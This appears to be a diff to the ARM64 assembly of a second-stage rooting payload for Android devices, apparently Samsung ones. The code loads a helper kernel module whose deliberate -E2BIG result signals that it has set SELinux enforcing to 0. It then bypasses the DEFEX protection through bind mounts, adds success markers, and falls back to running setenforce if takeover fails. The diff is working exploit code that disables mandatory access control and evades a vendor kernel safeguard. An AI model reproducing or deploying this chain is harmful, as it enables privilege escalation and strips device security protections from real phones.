@@ -178,6 +178,12 @@ mark_bind_ok:
     .asciz "/dev/dfm3"
 mark_exec_fail:
     .asciz "/dev/dfm4"
+setenforce_path:
+    .asciz "/system/bin/setenforce"
+setenforce_argv0:
+    .asciz "setenforce"
+setenforce_argv1:
+    .asciz "1"
 
 .ifdef DEBUG_LOG
 logdw_path2:
@@ -186,8 +192,14 @@ log_tag2:
     .asciz "dfdbg"
 msg_s2_match:
     .asciz "s2: modprobe matched"
-msg_s2_finit:
-    .asciz "s2: finit_module called"
+msg_s2_finit_ok:
+    .asciz "s2: finit_module expected -E2BIG, helper success"
+msg_s2_finit_enodev:
+    .asciz "s2: finit_module -ENODEV, helper self-check failed"
+msg_s2_finit_other:
+    .asciz "s2: finit_module unexpected result"
+msg_s2_marker_fail:
+    .asciz "s2: positive milestone marker creation failed"
 msg_s2_mount1:
     .asciz "s2: first mount ok"
 msg_s2_bind:
@@ -230,6 +242,10 @@ stage2_start:
     stp x26, x27, [sp, #-16]!
     stp x28, x29, [sp, #-16]!
     str x30, [sp, #-16]!
+    // Becomes 1 only after the helper's intentional -E2BIG success result.
+    // Any later failure uses it to attempt the physically proven enforcing
+    // restoration before exiting.
+    mov x28, xzr
 
     // x0 -> int argc
     ldr     w1, [x0]            // w1 = argc
@@ -253,7 +269,6 @@ strcmp_loop:
 matched:
     // argv[0] == executable_path
 
-    create_mark mark_stage2
     logdbg msg_s2_match, logdw_path2, log_tag2
 
     // open lib
@@ -263,15 +278,51 @@ matched:
     mov    x2, O_RDONLY
     mov     x8, #SYS_openat
     svc     0
+    tbnz    w0, #31, myexit
+    mov     x27, x0
 
-    // finit_module
+    // The helper deliberately returns -E2BIG after resolving its anchors and
+    // setting selinux_state.enforcing=0, so zero is not success here.
     adr x1, mod_args
     mov x2, xzr
     mov x8, #SYS_finit_module
     svc 0
+    mov x26, x0
 
-    logdbg msg_s2_finit, logdw_path2, log_tag2
+    mov x0, x27
+    mov x8, #SYS_close
+    svc 0
 
+    cmn x26, #E2BIG
+    b.ne finit_unexpected
+
+    mov x28, #1
+    logdbg msg_s2_finit_ok, logdw_path2, log_tag2
+
+    // dfm1 is a positive HELPER_SUCCESS milestone. It is created only after
+    // the expected -E2BIG and its own syscall result is checked.
+    create_mark mark_stage2
+    tbnz w0, #31, marker_fail
+    mov x27, x0
+    mov x8, #SYS_close
+    svc 0
+    b helper_success
+
+finit_unexpected:
+    cmn x26, #ENODEV
+    b.ne finit_other
+    logdbg msg_s2_finit_enodev, logdw_path2, log_tag2
+    b myexit
+
+finit_other:
+    logdbg msg_s2_finit_other, logdw_path2, log_tag2
+    b myexit
+
+marker_fail:
+    logdbg msg_s2_marker_fail, logdw_path2, log_tag2
+    b myexit
+
+helper_success:
     sub sp, sp, 64
 
     // Bypass DEFEX by bind mount.
@@ -291,6 +342,10 @@ matched:
     cbnz w0, myexit // not private: do NOT bind globally, spin instead
 
     create_mark mark_bind_ns
+    tbnz w0, #31, marker_fail
+    mov x27, x0
+    mov x8, #SYS_close
+    svc 0
 
     logdbg msg_s2_mount1, logdw_path2, log_tag2
     
@@ -306,6 +361,10 @@ matched:
     cbnz w0, myexit
 
     create_mark mark_bind_ok
+    tbnz w0, #31, marker_fail
+    mov x27, x0
+    mov x8, #SYS_close
+    svc 0
 
     logdbg msg_s2_bind, logdw_path2, log_tag2
 
@@ -339,6 +398,24 @@ matched:
 
 myexit:
     logdbg msg_s2_fail, logdw_path2, log_tag2
+    cbz x28, exit_stage2
+
+    // The helper has already made SELinux permissive, but ksud did not take
+    // over. Execute the same absolute setenforce operation proven on hardware
+    // as a best-effort cleanup. A failure still exits non-successfully.
+    sub sp, sp, 32
+    adr x0, setenforce_argv0
+    str x0, [sp]
+    adr x0, setenforce_argv1
+    str x0, [sp, 8]
+    str xzr, [sp, 16]
+    adr x0, setenforce_path
+    mov x1, sp
+    mov x2, xzr
+    mov x8, #SYS_execve
+    svc 0
+
+exit_stage2:
     mov x0, #1
     mov x8, #SYS_exit
     svc #0
@@ -360,4 +437,3 @@ end2:
 stage2_end:
 stage2_len:
     .word stage2_end - stage2_data
-
